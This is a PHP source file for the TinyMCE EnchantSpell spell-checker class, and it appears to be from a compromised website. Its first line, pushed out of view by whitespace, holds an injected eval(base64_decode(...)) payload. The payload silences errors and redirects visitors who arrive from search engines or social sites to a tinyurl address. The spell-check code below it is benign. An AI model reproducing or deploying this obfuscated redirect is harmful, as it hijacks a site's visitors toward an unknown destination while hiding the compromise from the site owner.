<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * This class was contributed by Michel Weimerskirch.
 *
 * @author Moxiecode
 * @copyright Copyright © 2004-2007, Moxiecode Systems AB, All rights reserved.
 */

class EnchantSpell extends SpellChecker {
	/**
	 * Spellchecks an array of words.
	 *
	 * @param String $lang Selected language code (like en_US or de_DE). Shortcodes like "en" and "de" work with enchant >= 1.4.1
	 * @param Array $words Array of words to check.
	 * @return Array of misspelled words.
	 */
	function &checkWords($lang, $words) {
		$r = enchant_broker_init();
		
		if (enchant_broker_dict_exists($r,$lang)) {
			$d = enchant_broker_request_dict($r, $lang);
			
			$returnData = array();
			foreach($words as $key => $value) {
				$correct = enchant_dict_check($d, $value);
				if(!$correct) {
					$returnData[] = trim($value);
				}
			}
	
			return $returnData;
			enchant_broker_free_dict($d);
		} else {

		}
		enchant_broker_free($r);
	}

	/**
	 * Returns suggestions for a specific word.
	 *
	 * @param String $lang Selected language code (like en_US or de_DE). Shortcodes like "en" and "de" work with enchant >= 1.4.1
	 * @param String $word Specific word to get suggestions for.
	 * @return Array of suggestions for the specified word.
	 */
	function &getSuggestions($lang, $word) {
		$r = enchant_broker_init();
		$suggs = array();

		if (enchant_broker_dict_exists($r,$lang)) {
			$d = enchant_broker_request_dict($r, $lang);
			$suggs = enchant_dict_suggest($d, $word);

			enchant_broker_free_dict($d);
		} else {

		}
		enchant_broker_free($r);

		return $suggs;
	}
}

?>
